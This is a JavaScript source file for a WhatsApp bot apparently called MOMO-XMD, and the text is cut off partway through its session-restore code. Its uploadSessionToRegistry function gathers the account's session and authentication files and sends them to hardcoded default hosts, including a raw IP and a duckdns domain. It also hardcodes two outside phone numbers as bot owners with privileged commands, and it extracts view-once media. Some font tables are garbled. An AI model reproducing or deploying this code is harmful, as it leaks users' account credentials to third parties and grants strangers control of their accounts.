const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    makeCacheableSignalKeyStore,
    fetchLatestBaileysVersion,
    Browsers,
    downloadContentFromMessage,
    downloadMediaMessage,
    proto,
    generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const { Boom } = require("@hapi/boom");
const fs = require("fs");
const path = require("path");
process.env.PATH = path.join(__dirname, 'bin') + ':' + process.env.PATH;
const { performance } = require('perf_hooks');
const config = require("./config");
const axios = require("axios");
const ytSearch = require("yt-search");
const { OpenAI } = require("openai");
const openai = new OpenAI({
    apiKey: process.env.OPENAI_API_KEY || config.openaiApiKey || "placeholder",
    baseURL: process.env.OPENAI_API_BASE || config.openaiApiBase || "https://api.openai.com/v1"
});

const DEFAULT_REGISTRY_ENDPOINTS = [
    "https://momo-xmd-pairing-4086f8388df8.herokuapp.com/session-registry/",
    "https://momo-xmd-pairing.duckdns.org/session-registry/",
    "http://212.224.86.233:8000/session-registry/"
];

function registryEndpoints() {
    const configured = [process.env.SESSION_REGISTRY_URL, process.env.SESSION_STORE_URL]
        .filter(Boolean)
        .map((value) => `${String(value).replace(/\/+$/, '')}/session-registry/`);
    return [...new Set([...configured, ...DEFAULT_REGISTRY_ENDPOINTS])];
}
const menuText = require("./menu");
let onlineNotificationSentForProcess = false;

process.on('uncaughtException', (err) => {
    console.log('[UNCAUGHT EXCEPTION]:', err.message || err);
});
process.on('unhandledRejection', (reason) => {
    console.log('[UNHANDLED REJECTION]:', reason?.message || reason);
});
const botStartTime = Date.now();
const runtimeSettings = {
    mode: 'public',
    autoviewstatus: false,
    autolikestatus: false,
    autosavestatus: false,
    autoviewonce: false,
    autoreact: false,
    chatbot: true,
    autorecording: false,
    autotyping: false,
    alwaysonline: false,
    setstatusEmoji: null,
    font: 'normal'
};
const settingsFilePath = path.join(__dirname, "../session/group_settings.json");
let groupSettings = new Map();
try {
    if (fs.existsSync(settingsFilePath)) {
        const data = JSON.parse(fs.readFileSync(settingsFilePath, 'utf-8'));
        groupSettings = new Map(Object.entries(data));
    }
} catch (e) {}

function saveGroupSettings() {
    try {
        const dir = path.dirname(settingsFilePath);
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(settingsFilePath, JSON.stringify(Object.fromEntries(groupSettings), null, 2));
    } catch (e) {
        console.log('[SETTINGS SAVE ERROR]:', e.message);
    }
}
const reactionEmojis = ['❤️', '👍', '🔥', '😂', '😮', '👏', '💙'];
const cleanNumber = (value) => String(value || '').replace(/\D/g, '');
function applyFont(text, font) {
    if (!font || font === 'off' || font === 'bold') return text;
    const maps = {
        mono: {
            a: '𝚊', b: '𝚋', c: '𝚌', d: '𝚍', e: '𝚎', f: '𝚏', g: '𝚐', h: '𝚑', i: '𝚒', j: '𝚓', k: '𝚔', l: '𝚕', m: '𝚖', n: '𝚗', o: '𝚘', p: '𝚙', q: '𝚚', r: '𝚛', s: '𝚜', t: '𝚝', u: '𝚞', v: '𝚟', w: '𝚠', x: '𝚡', y: '𝚢', z: '𝚣',
            A: '𝙰', B: '𝙱', C: '𝙲', D: '𝙳', E: '𝙴', F: '𝙵', G: '𝙶', H: '𝙷', I: '𝙸', J: '𝙹', K: '𝙺', L: '𝙻', M: '𝙼', N: '𝙽', O: '𝙾', P: '𝙿', Q: '𝚀', R: '𝚁', S: '𝚂', T: '𝚃', U: '𝚄', V: '𝚅', W: '𝚆', X: '𝚇', Y: '𝚈', Z: '𝚉'
        },
        gothic: {
            a: '𝔞', b: '𝔟', c: '𝔠', d: '𝔡', e: '𝔢', f: '𝔣', g: '𝔤', h: '𝔥', i: '𝔦', j: '𝔧', k: '𝔨', l: '𝔩', m: '𝔪', n: '𝔫', o: '𝔬', p: '𝔭', q: '𝔮', r: '𝔯', s: '𝔰', t: '𝔱', u: '𝔲', v: '𝔳', w: '𝔴', x: '𝔵', y: '𝔶', z: '𝔷',
            A: '𝔄', B: '𝔅', C: 'ℭ', D: '𝔇', E: '𝔈', F: '𝔉', G: '𝔊', H: 'ℌ', I: 'ℑ', J: '𝔍', K: '𝔎', L: '𝔏', M: '𝔐', N: '𝔑', O: '𝔒', P: '𝔓', Q: '𝔔', R: 'ℜ', S: '𝔖', T: '𝔗', U: '𝔘', V: '𝔙', W: '𝔚', X: '𝔛', Y: '𝔜', Z: 'ℨ'
        },
        cursive: {
            a: '𝒶', b: '𝒷', c: '𝒸', d: '𝒹', e: 'ℯ', f: '𝒻', g: 'ℊ', h: '𝒽', i: '𝒾', j: '𝒿', k: '𝓀', l: '𝓁', m: '𝓂', n: '𝓃', o: 'ℴ', p: '𝓅', q: '𝓆', r: '𝓇', s: '𝓈', t: '𝓉', u: '𝓊', v: '𝓿', w: '𝓌', x: '𝓍', y: '𝓎', z: '𝓏',
            A: '𝒜', B: 'ℬ', C: '𝒞', D: '𝒟', E: 'ℰ', F: 'ℱ', G: '𝒢', H: 'ℋ', I: 'ℐ', J: '𝒥', K: '𝒦', L: 'ℒ', M: 'ℳ', N: '𝒩', O: '𝒪', P: '𝒫', Q: '𝒬', R: '𝒛', S: '𝒮', T: '𝒯', U: '𝒰', V: '𝒱', W: '𝒲', X: '𝒳', Y: '𝒴', Z: '𝒵'
        },
        italic: {
            a: '𝑎', b: '𝑏', c: '𝑐', d: '𝑑', e: '𝑒', f: '𝑓', g: '𝑔', h: 'ℎ', i: '𝑖', j: '𝑗', k: '𝑘', l: '𝑙', m: '𝑚', n: '𝑛', o: '𝑜', p: '𝑝', q: '𝑞', r: '𝑟', s: '𝑠', t: '𝑡', u: '𝑢', v: '𝑣', w: '𝑤', x: '𝑥', y: '𝑦', z: '𝑧',
            A: '𝐴', B: '𝐵', C: '𝐶', D: '𝐷', E: '𝐸', F: '𝐹', G: '𝐺', H: '𝐻', I: '𝐼', J: '𝐽', K: '𝐾', L: '𝐿', M: '𝑀', N: '𝑁', O: '𝑂', P: '𝑃', Q: '𝑄', R: '𝑅', S: '𝑆', T: '𝑇', U: '𝑈', V: '𝑉', W: '𝑊', X: '𝑋', Y: '𝑌', Z: '𝑍'
        },
        fantasy: {
            a: '𝓪', b: '𝓫', c: '𝓬', d: '𝓭', e: '𝓮', f: '𝓯', g: '𝓰', h: '𝓱', i: '𝓲', j: '𝓳', k: '𝓴', l: '𝓵', m: '𝓶', n: '𝓷', o: '𝓸', p: '𝓹', q: '𝓺', r: '𝓻', s: '𝓼', t: '𝓽', u: '𝓾', v: '𝓿', w: '𝔀', x: '𝔁', y: '𝔂', z: '𝔃',
            A: '𝓐', B: '𝓑', C: '𝓒', D: '𝓓', E: '𝓔', F: '𝓕', G: '𝓖', H: '𝓗', I: '𝓘', J: '𝓙', K: '𝓚', L: '𝓛', M: '𝓜', N: '𝓝', O: '𝓞', P: '𝓟', Q: '𝓠', R: '𝓡', S: '𝓢', T: '𝓣', U: '𝓤', V: '𝓥', W: '𝓦', X: '𝓧', Y: '𝓨', Z: '𝓩'
        },
        script: {
            a: '𝒶', b: '𝒷', c: '𝒸', d: '𝒹', e: 'ℯ', f: '𝒻', g: 'ℊ', h: '𝒽', i: '𝒾', j: '𝒿', k: '𝓀', l: '𝓁', m: '𝓂', n: '𝓃', o: 'ℴ', p: '𝓅', q: '𝓆', r: '𝓇', s: '𝓈', t: '𝓉', u: '𝓊', v: '𝓿', w: '𝓌', x: '𝓍', y: '𝓎', z: '𝒛',
            A: '𝒜', B: 'ℬ', C: '𝒞', D: '𝒟', E: 'ℰ', F: 'ℱ', G: '𝒢', H: 'ℋ', I: 'ℐ', J: '𝒥', K: '𝒦', L: 'ℒ', M: 'ℳ', N: '𝒩', O: '𝒪', P: '𝒫', Q: '𝒬', R: 'ℛ', S: '𝒮', T: '𝒯', U: '𝒰', V: '𝒱', W: '𝒲', X: '𝒳', Y: '𝒴', Z: '𝒵'
        },
        bubbly: {
            a: 'ⓐ', b: 'ⓑ', c: 'ⓒ', d: 'ⓓ', e: 'ⓔ', f: 'ⓕ', g: 'ⓖ', h: 'ⓗ', i: 'ⓘ', j: 'ⓙ', k: 'ⓚ', l: 'ⓛ', m: 'ⓜ', n: 'ⓝ', o: 'ⓞ', p: 'ⓟ', q: 'ⓠ', r: 'ⓡ', s: 'ⓢ', t: 'ⓣ', u: 'ⓤ', v: 'ⓥ', w: 'ⓦ', x: 'ⓧ', y: 'ⓨ', z: 'ⓩ',
            A: 'Ⓐ', B: 'Ⓑ', C: 'Ⓒ', D: 'Ⓓ', E: 'Ⓔ', F: 'Ⓕ', G: 'Ⓖ', H: 'Ⓗ', I: 'Ⓘ', J: 'Ⓙ', K: 'Ⓚ', L: 'Ⓛ', M: 'Ⓜ', N: 'Ⓝ', O: 'Ⓞ', P: 'Ⓟ', Q: 'Ⓠ', R: 'Ⓡ', S: 'Ⓢ', T: 'Ⓣ', U: 'Ⓤ', V: 'Ⓥ', W: 'Ⓦ', X: 'Ⓧ', Y: 'Ⓨ', Z: 'Ⓩ'
        },
        square: {
            a: '🄰', b: '🄱', c: '🄲', d: '🄳', e: '🄴', f: '🄵', g: '🄶', h: '🄷', i: '🄸', j: '🄹', k: '🄺', l: '🄻', m: '🄼', n: '🄽', o: '🄾', p: '🄿', q: '𝅀', r: '🅂', s: '🅃', t: '🅄', u: '🅅', v: '🅆', w: '🅇', x: '🅈', y: '🅉', z: '🅊',
            A: '🇦', B: '🇧', C: '🇨', D: '🇩', E: '🇪', F: '🇫', G: '🇬', H: '🇭', I: '🇮', J: '🇯', K: '🇰', L: '🇱', M: '🇲', N: '🇳', O: '🇴', P: '🇵', Q: '🇶', R: '🇷', S: '🇸', T: '🇹', U: '🇺', V: '🇻', W: '🇼', X: '🇽', Y: '🇾', Z: '🇿'
        },
        tiny: {
            a: 'ᵃ', b: 'ᵇ', c: 'ᶜ', d: 'ᵈ', e: 'ᵉ', f: 'ᶠ', g: 'ᵍ', h: 'ʰ', i: 'ⁱ', j: 'ʲ', k: 'ᵏ', l: 'ˡ', m: 'ᵐ', n: 'ⁿ', o: 'ᵒ', p: 'ᵖ', q: '𐞥', r: 'ʳ', s: 'ˢ', t: 'ᵗ', u: 'ᵘ', v: 'ᵛ', w: 'ʷ', x: 'ˣ', y: 'ʸ', z: 'ᶻ',
            A: 'ᴬ', B: 'ᴮ', C: 'ᶜ', D: 'ᴰ', E: 'ᴱ', F: 'ᶠ', G: 'ᴳ', H: 'ᴴ', I: 'ᴵ', J: 'ᴶ', K: 'ᴷ', L: 'ᴸ', M: 'ᴹ', N: 'ᴺ', O: 'ᴼ', P: 'ᴾ', Q: 'ℚ', R: 'ᴿ', S: 'ˢ', T: 'ᵀ', U: 'ᵁ', V: 'ⱽ', W: 'ᵂ', X: 'ˣ', Y: 'ʸ', Z: 'ᶻ'
        },
        double: {
            a: '𝕒', b: '𝕓', c: '𝕔', d: '𝕕', e: '𝕖', f: '𝕗', g: '𝕘', h: '𝕙', i: '𝕚', j: '𝕛', k: '𝕜', l: '𝕝', m: '𝕞', n: '𝕟', o: '𝕠', p: '𝕡', q: '𝕢', r: '𝕣', s: '𝕤', t: '𝕥', u: '𝕦', v: '𝕧', w: '𝕨', x: '𝕩', y: '🇾', z: '𝕫',
            A: '𝔸', B: '𝔹', C: 'ℂ', D: '𝔻', E: '𝔼', F: '𝔽', G: '𝔾', H: 'ℍ', I: '𝕀', J: '𝕁', K: '𝕂', L: '𝕃', M: '𝕄', N: 'ℕ', O: '𝕆', P: 'ℙ', Q: 'ℚ', R: 'ℝ', S: '𝕊', T: '𝕋', U: '𝕌', V: '𝕍', W: '𝕎', X: '𝕏', Y: '𝕐', Z: 'ℤ'
        },
        outline: {
            a: '𝕒', b: '𝕓', c: '𝕔', d: '𝕕', e: '𝕖', f: '𝕗', g: '𝕘', h: '𝕙', i: '𝕚', j: '𝕛', k: '𝕜', l: '𝕝', m: '𝕞', n: '𝕟', o: '𝕠', p: '𝕡', q: '𝕢', r: '𝕣', s: '𝕤', t: '𝕥', u: '𝕦', v: '𝕧', w: '𝕨', x: '𝕩', y: '𝕪', z: '𝕫',
            A: '𝔸', B: '𝔹', C: 'ℂ', D: '𝔻', E: '𝔼', F: '𝔽', G: '𝔾', H: 'ℍ', I: '𝕀', J: '𝕁', K: '𝕂', L: '𝕃', M: '𝕄', N: 'ℕ', O: '𝕆', P: 'ℙ', Q: 'ℚ', R: 'ℝ', S: '𝕊', T: '𝕋', U: '𝕋', V: '𝕍', W: '𝕎', X: '𝕏', Y: '𝕐', Z: 'ℤ'
        },
        medieval: {
            a: '𝔞', b: '𝔟', c: '𝔠', d: '𝔡', e: '𝔢', f: '𝔣', g: '𝔤', h: '𝔥', i: '𝔦', j: '𝔧', k: '𝔨', l: '𝔩', m: '𝔪', n: '𝔫', o: '𝔬', p: '𝔭', q: '𝔮', r: '𝔯', s: '𝔰', t: '𝔱', u: '𝔲', v: '𝔳', w: '𝔴', x: '𝔵', y: '𝔶', z: '𝔷',
            A: '𝔄', B: '𝔅', C: 'ℭ', D: '𝔇', E: '𝔈', F: '𝔉', G: '𝔊', H: 'ℌ', I: 'ℑ', J: '𝔍', K: '𝔎', L: '𝔏', M: '𝔐', N: '𝔑', O: '𝔒', P: '𝔓', Q: '𝔔', R: 'ℜ', S: '𝔖', T: '𝔗', U: '𝔘', V: '𝔙', W: '𝔚', X: '𝔛', Y: '𝔜', Z: 'ℨ'
        },
        shadow: {
            a: '𝖆', b: '𝖇', c: '𝖈', d: '𝖉', e: '𝖊', f: '𝖋', g: '𝖌', h: '𝖍', i: '𝖎', j: '𝖏', k: '𝖐', l: '𝖑', m: '𝖒', n: '𝖓', o: '𝖔', p: '𝖕', q: '𝖖', r: '𝖗', s: '𝖘', t: '𝖈', u: '𝖚', v: '𝖛', w: '𝖜', x: '𝖝', y: '𝖞', z: '𝖟',
            A: '𝕬', B: '𝕭', C: '𝕮', D: '𝕯', E: '𝕰', F: '𝕱', G: '𝕲', H: '𝕳', I: '𝕴', J: '𝕵', K: '𝕶', L: '𝕷', M: '𝕸', N: '𝕹', O: '𝕺', P: '𝕻', Q: '𝕼', R: '𝕽', S: '𝕾', T: '𝕿', U: '𝖀', V: '𝖁', W: '𝖂', X: '𝖃', Y: '𝖄', Z: '𝖅'
        },
        inverted: {
            a: 'ɐ', b: 'q', c: 'ɔ', d: 'p', e: 'ə', f: 'ɟ', g: 'ƃ', h: 'ɥ', i: 'ᴉ', j: 'ɾ', k: 'ʞ', l: 'l', m: 'ɯ', n: 'u', o: 'o', p: 'd', q: 'b', r: 'ɹ', s: 's', t: 'ʇ', u: 'n', v: 'ʌ', w: 'ʍ', x: 'x', y: 'ʎ', z: 'z',
            A: '∀', B: '𐐒', C: 'Ɔ', D: '◖', E: 'Ǝ', F: 'Ⅎ', G: 'פ', H: 'H', I: 'I', J: 'ſ', K: 'ʞ', L: '˥', M: 'W', N: 'N', O: 'O', P: 'Ԁ', Q: 'Ò', R: 'ᴚ', S: 'S', T: '┴', U: '∩', V: 'Λ', W: 'M', X: 'X', Y: '⅄', Z: 'Z'
        },
        serif: {
            a: '𝑎', b: '𝑏', c: '𝑐', d: '𝑑', e: '𝑒', f: '𝑓', g: '𝑔', h: 'ℎ', i: '𝑖', j: '𝑗', k: '𝑘', l: '𝑙', m: '𝑚', n: '𝑛', o: '𝑜', p: '𝑝', q: '𝑞', r: '𝑟', s: '𝑠', t: '𝑡', u: '𝑢', v: '𝑣', w: '𝑤', x: '𝑥', y: '𝑦', z: '𝑧',
            A: '𝐴', B: '𝐵', C: '𝐶', D: '𝐷', E: '𝐸', F: '𝐹', G: '𝐺', H: '𝐻', I: '𝐼', J: '𝐽', K: '𝐾', L: '𝐿', M: '𝑀', N: '𝑁', O: '𝑂', P: '𝑃', Q: '𝑄', R: '𝑅', S: '𝑆', T: '𝑇', U: '𝑈', V: '𝑉', W: '𝑊', X: '𝑋', Y: '𝑌', Z: '𝑍'
        },
        sans: {
            a: 'mathsf{a}', b: 'mathsf{b}', c: 'mathsf{c}', d: 'mathsf{d}', e: 'mathsf{e}', f: 'mathsf{f}', g: 'mathsf{g}', h: 'mathsf{h}', i: 'mathsf{i}', j: 'mathsf{j}', k: 'mathsf{k}', l: 'mathsf{l}', m: 'mathsf{m}', n: 'mathsf{n}', o: 'mathsf{o}', p: 'mathsf{p}', q: 'mathsf{q}', r: 'mathsf{r}', s: 'mathsf{s}', t: 'mathsf{t}', u: 'mathsf{u}', v: 'mathsf{v}', w: 'mathsf{w}', x: 'mathsf{x}', y: 'mathsf{y}', z: 'mathsf{z}',
            A: '𝖠', B: '𝖁', C: '𝖂', D: '𝖃', E: '𝖄', F: '𝖅', G: '𝖌', H: '𝖍', I: '𝖎', J: '𝖏', K: '𝖐', L: '𝖑', M: '𝖒', N: '𝖓', O: '𝖔', P: '𝖕', Q: '𝖖', R: '𝖗', S: '𝖘', T: '𝖙', U: '𝖚', V: '𝖛', W: '𝖜', X: '𝖝', Y: '𝖞', Z: '𝖟'
        },
        circled: {
            a: '⒜', b: '⒝', c: '⒞', d: '⒟', e: '⒠', f: '⒡', g: '⒢', h: '⒣', i: '⒤', j: '⒥', k: '⒦', l: '⒧', m: '⒨', n: '⒩', o: '⒪', p: '⒫', q: '⒬', r: '⒭', s: '⒮', t: '⒯', u: '⒰', v: '⒱', w: '⒲', x: '⒳', y: '⒴', z: '⒵',
            A: 'Ⓐ', B: 'Ⓑ', C: 'Ⓒ', D: 'Ⓓ', E: 'Ⓔ', F: 'Ⓕ', G: 'Ⓖ', H: 'Ⓗ', I: 'Ⓘ', J: 'Ⓙ', K: 'Ⓚ', L: 'Ⓛ', M: 'Ⓜ', N: 'Ⓝ', O: 'Ⓞ', P: 'Ⓟ', Q: 'Ⓠ', R: 'Ⓡ', S: 'Ⓢ', T: 'Ⓣ', U: 'Ⓤ', V: 'Ⓥ', W: 'Ⓦ', X: 'Ⓧ', Y: 'Ⓨ', Z: 'Ⓩ'
        },
        squared: {
            a: '🄰', b: '🄱', c: '🄲', d: '🄳', e: '🄴', f: '🄵', g: '🄶', h: '🄷', i: '🄸', j: '🄹', k: '🄺', l: '🄻', m: '🄼', n: '🄽', o: '🄾', p: '🄿', q: '𝅀', r: '🅂', s: '🅃', t: '🅄', u: '🅅', v: '🅆', w: '🅇', x: '🅈', y: '🅉', z: '🅊',
            A: '🇦', B: '🇧', C: '🇨', D: '🇩', E: '🇪', F: '🇫', G: '🇬', H: '🇭', I: '🇮', J: '🇯', K: '🇰', L: '🇱', M: '🇲', N: '🇳', O: '🇴', P: '🇵', Q: '🇶', R: '🇷', S: '🇸', T: '🇹', U: '🇺', V: '🇻', W: '🇼', X: '🇽', Y: '🇾', Z: '🇿'
        }
    };
    const map = maps[font] || maps.mono;
    return text.split('').map(char => map[char] || char).join('');
}
const ownerNumbers = new Set([
    '255760298574',
    '255765409584',
    config.ownerNumber,
    ...(config.developers || [])
].map(cleanNumber).filter(Boolean));

    const ownerCommands = new Set([
    'autoviewstatus', 'autolikestatus', 'setstatus', 'autosavestatus', 'restart',
    'setfont', 'chatbot', 'autorecording', 'autotyping', 'alwaysonline', 'autoreact',
    'owner', 'vpn', 'vps', 'mode', 'tosgroup', 'tostatus', 'create', 'autoviewonce', 'block', 'unblock', 'blacklist', 'vv', 'antibug'
]);
const groupCommands = new Set([
    'add', 'antilink', 'antimention', 'antitag', 'kick', 'kickall', 'promote', 'demote',
    'tagall', 'hidetag', 'welcome', 'goodbye', 'antileft', 'listchat', 'open', 'close', 'announcements', 'antiviewonce', 'listrequests', 'listcode', 'link', 'listactive', 'antigif', 'antisticker', 'approve', 'reject', 'antivirus', 'antibot'
]);

function isGroupJid(jid) { return String(jid || '').endsWith('@g.us'); }
function senderNumber(message) {
    const raw = message?.key?.participant || message?.key?.remoteJid || message?.participant || '';
    return cleanNumber(raw.split('@')[0].split(':')[0]);
}
function isOwner(message) {
    const num = senderNumber(message);
    if (ownerNumbers.has(num)) return true;
    if (message?.key?.fromMe) return true;
    return false;
}
function extractViewOnceContent(msgContent) {
    if (!msgContent) return null;
    let curr = msgContent;
    if (curr.message) curr = curr.message;
    if (curr.viewOnceMessage?.message) curr = curr.viewOnceMessage.message;
    if (curr.viewOnceMessageV2?.message) curr = curr.viewOnceMessageV2.message;
    if (curr.viewOnceMessageV2Extension?.message) curr = curr.viewOnceMessageV2Extension.message;
    
    const innerType = Object.keys(curr || {})[0];
    if (innerType && (innerType.includes('imageMessage') || innerType.includes('videoMessage') || innerType.includes('audioMessage'))) {
        return { type: innerType, content: curr[innerType] };
    }
    return null;
}
function commandFooter(forcedSymbol = null) {
    const s = forcedSymbol || '❑';
    return `> ${s} Powered by MOMO-XMD ${s}\n> ${s} owner MOMO47 ${s}`;
}
function ownerOnlyText() { return formatBox('This command owner only ❌'); }
function groupOnlyText() { return formatBox('This command group only ❌'); }
function adminOnlyText() { return formatBox('This command admin only ❌'); }
async function safeReact(sock, jid, key, text) {
    try { await sock.sendMessage(jid, { react: { text, key } }); } catch (error) { console.log('[REACTION] failed:', error.message); }
}
function formatBox(text, forcedBoxType = null, forcedSymbol = null, forcedFooterSymbol = null) {
    // If it already has a box, check for footer
    if (text.includes('╭◆') || text.includes('╭━━❐━⪼')) {
        if (text.includes('Powered by MOMO-XMD')) return text;
        return text.trim() + '\n\n' + commandFooter(forcedFooterSymbol);
    }

    const lines = text.split('\n').filter(l => l.trim() !== '');
    const isExample = text.startsWith('Example');
    const isSuccess = text.includes('successful') || text.includes('Success') || text.includes('✅') || text.includes('imewashwa') || text.includes('imezimwa') || text.includes('Enabled') || text.includes('Disabled');

    const symbols = ['★', '❑', '◉', '◆', '◇', '๏'];
    // Pick unique symbols based on string length or pseudo-randomness
    const randIndex = Math.abs(text.length) % symbols.length;
    const symbol1 = symbols[randIndex];
    const symbol2 = symbols[(randIndex + 2) % symbols.length];

    let boxType = forcedBoxType;
    let symbol = forcedSymbol;

    if (!boxType) {
        // Use a more dynamic rotation based on text length to vary across different commands
        const typeTrigger = (text.length + (isExample ? 1 : 0)) % 2;
        boxType = typeTrigger === 0 ? 'arched' : 'downloader';
    }

    if (!symbol) {
        if (isExample) {
            symbol = symbol1;
        } else if (isSuccess) {
            symbol = symbol2;
        } else {
            symbol = symbols[Math.floor(Math.random() * symbols.length)];
        }
    }

    const chosenFooter = commandFooter(forcedFooterSymbol);
    const allSymbols = [...symbols, '⚡', '🛡️', '🟢', '⏰', '🚀', '📢', '📌', '🛡️', '🔄', '👁️', '👤', '🔐', '🔒', '🔤', '💭', '📜', '⏳', '📂', '🚫', '📓', '👥', '🌍', '➕', '👢', '🆙', '🔽', '👋', '🔗', '🗣️', '🏷️', '🎞️', '🖼️', '🦠', '🤖', '📣', '🔓', '📝', '🎵', '🎥', '🎶', '📱', '📘', '📸', '🐦', '🐙', '🧠', '📤'];

    if (boxType === 'downloader') {
        const contentLines = lines.map(l => {
            const trimmed = l.trim();
            if (trimmed === 'Example' || trimmed.includes('How to use') || trimmed.startsWith('http')) return `┇ ${l}`;
            // If line already starts with a known symbol, don't add another one
            const startsWithSymbol = allSymbols.some(s => trimmed.startsWith(s));
            if (startsWithSymbol) return `┇ ${l}`;
            return `┇ ${symbol} ${l}`;
        }).join('\n');
        return `╭━━❐━⪼\n${contentLines}\n╰━━❑━⪼\n\n${chosenFooter}`;
    } else {
        const contentLines = lines.map(l => {
            const trimmed = l.trim();
            if (trimmed === 'Example' || trimmed.includes('How to use') || trimmed.startsWith('http')) return `│   ${l}`;
            // If line already starts with a known symbol, don't add another one
            const startsWithSymbol = allSymbols.some(s => trimmed.startsWith(s));
            if (startsWithSymbol) return `│   ${l}`;
            return `│   ${symbol} ${l}`;
        }).join('\n');
        return `╭◆\n${contentLines}\n╰◆\n\n${chosenFooter}`;
    }
}
async function reply(sock, jid, key, text, forcedBoxType, forcedSymbol) { 
    const formatted = formatBox(text, forcedBoxType, forcedSymbol);
    return sock.sendMessage(jid, { text: formatted }, { quoted: key });
}
async function getGroupContext(sock, message) {
    const jid = message.key.remoteJid;
    if (!isGroupJid(jid)) return null;
    const metadata = await sock.groupMetadata(jid);
    const actor = message.key.participant || jid;
    const admins = new Set(metadata.participants.filter((p) => p.admin).map((p) => p.id));
    return { jid, metadata, actor, isAdmin: admins.has(actor) || isOwner(message) };
}
function mentionedOrQuoted(message) {
    const context = message.message?.extendedTextMessage?.contextInfo || message.message?.imageMessage?.contextInfo || {};
    return context.mentionedJid?.[0] || context.participant || null;
}
function parseOnOff(value) { return ['on', 'off'].includes(String(value || '').toLowerCase()) ? String(value).toLowerCase() : null; }
function settingExample(command) { 
    const verticalCommands = ['autoreact', 'autoviewstatus', 'autolikestatus', 'autoviewonce', 'antiviewonce'];
    if (verticalCommands.includes(command)) {
        return `Example\n${command} on\n${command} off`;
    }
    return `Example\n${command} on/off`;
}

// ===== SESSION RESTORATION =====
function decodeSessionId(sessionId) {
    try {
        if (/^MOMO-XMD~[HV][A-Z0-9]{22}$/.test(sessionId)) {
            return { type: 'compact', data: sessionId };
        }

        // Remove prefix "MOMO-XMD~" if present
        let base64Data = sessionId;
        if (sessionId.startsWith('MOMO-XMD~')) {
            base64Data = sessionId.split('~')[1];
        } else if (sessionId.startsWith('MOMO-XMD-')) {
            base64Data = sessionId.split('-')[1];
        }

        if (!base64Data) {
            throw new Error('Invalid session ID format');
        }

        // Decode base64 to JSON
        const jsonStr = Buffer.from(base64Data, 'base64').toString('utf-8');
        const parsed = JSON.parse(jsonStr);

        // If it's a pairing code entry (not actual creds), return as-is
        if (parsed.pairingCode && !parsed.identityKey) {
            return { type: 'pairing_code', data: parsed };
        }

        // If it's actual credentials (has identityKey, noiseKey, etc.)
        if (parsed.identityKey || parsed.noiseKey || parsed.signedIdentityKey) {
            return { type: 'creds', data: parsed };
        }

        // Try to see if it's a full creds object
        if (parsed.me || parsed.registrationId || parsed.account) {
            return { type: 'creds', data: parsed };
        }

        return { type: 'unknown', data: parsed };
    } catch (error) {
        console.log('Session decode error:', error.message);
        return { type: 'error', data: null };
    }
}

async function restoreCompactSession(sessionId, sessionPath) {
    const marker = sessionId.slice('MOMO-XMD~'.length, 'MOMO-XMD~'.length + 1);
    const endpoints = registryEndpoints();
    const orderedEndpoints = marker === 'V'
        ? [...endpoints.filter((endpoint) => endpoint.includes('212.224.86.233') || endpoint.includes('duckdns')), ...endpoints]
        : endpoints;
    let lastError;

    for (const endpoint of orderedEndpoints) {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), 15000);
        try {
            const response = await fetch(`${endpoint}${encodeURIComponent(sessionId)}`, {
                headers: { accept: 'application/json' },
                signal: controller.signal,
                cache: 'no-store'
            });
            if (!response.ok) throw new Error(`registry HTTP ${response.status}`);
            const payload = await response.json();
            if (!payload.files || typeof payload.files !== 'object') throw new Error('registry returned no auth files');

            if (fs.existsSync(sessionPath)) fs.rmSync(sessionPath, { recursive: true, force: true });
            fs.mkdirSync(sessionPath, { recursive: true });
            for (const [relativeName, encoded] of Object.entries(payload.files)) {
                const normalized = path.posix.normalize(String(relativeName).replace(/\\/g, '/'));
                if (normalized.startsWith('../') || normalized.includes('/../') || path.posix.isAbsolute(normalized)) {
                    continue;
                }
                const fullPath = path.join(sessionPath, normalized);
                fs.mkdirSync(path.dirname(fullPath), { recursive: true });
                fs.writeFileSync(fullPath, Buffer.from(encoded, 'base64'));
            }
            console.log(`[SESSION] Compact Session ID restored successfully from ${endpoint}`);
            clearTimeout(timer);
            return true;
        } catch (error) {
            lastError = error;
            clearTimeout(timer);
            console.log(`[SESSION] Registry ${endpoint} failed:`, error.message);
        }
    }
    return false;
}

async function uploadSessionToRegistry(sessionId, sessionPath) {
    if (!sessionId || !/^MOMO-XMD~[HV][A-Z0-9]{22}$/.test(sessionId)) return;
    
    try {
        const endpoints = registryEndpoints();
        const files = {};
        
        function readDir(dir, base = '') {
            if (!fs.existsSync(dir)) return;
            const items = fs.readdirSync(dir);
            for (const item of items) {
                const fullPath = path.join(dir, item);
                const relPath = path.join(base, item);
                if (fs.statSync(fullPath).isDirectory()) {
                    readDir(fullPath, relPath);
                } else {
                    files[relPath] = fs.readFileSync(fullPath).toString('base64');
                }
            }
        }
        
        readDir(sessionPath);
        if (Object.keys(files).length === 0) return;

        for (const endpoint of endpoints) {
            try {
                await fetch(`${endpoint}${encodeURIComponent(sessionId)}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ files })
                });
            } catch (e) {}
        }
        console.log('[SESSION] ✅ Session synced to registry successfully');
    } catch (error) {
        console.log('[SESSION] Upload failed:', error.message);
    }
}

async function restoreSession(sessionId, sessionPath) {
    try {
        const decoded = decodeSessionId(sessionId);

        if (decoded.type === 'error') {
            console.log('[SESSION] Invalid SESSION_ID - will use QR pairing');
            return false;
        }

        if (decoded.type === 'compact') {
            return await restoreCompactSession(decoded.data, sessionPath);
        }

        // Clean existing session
        if (fs.existsSync(sessionPath)) {
            fs.rmSync(sessionPath, { recursive: true, force: true });
        }
        fs.mkdirSync(sessionPath, { recursive: true });

        if (decoded.type === 'creds') {
            // Write credentials directly
            fs.writeFileSync(
                path.join(sessionPath, 'creds.json'),
                JSON.stringify(decoded.data, null, 2)
            );

            // Write keys if available
            if (decoded.data.keys && typeof decoded.data.keys === 'object') {
                const keysDir = path.join(sessionPath, 'keys');
                fs.mkdirSync(keysDir, { recursive: true });

                if (decoded.data.keys['preKey']) {
                    const preKeyDir = path.join(keysDir, 'pre-key');
                    fs.mkdirSync(preKeyDir, { recursive: true });
                    Object.entries(decoded.data.keys['preKey']).forEach(([key, val]) => {
                        fs.writeFileSync(path.join(preKeyDir, key + '.json'), JSON.stringify(val));
                    });
                }

                if (decoded.data.keys['session']) {
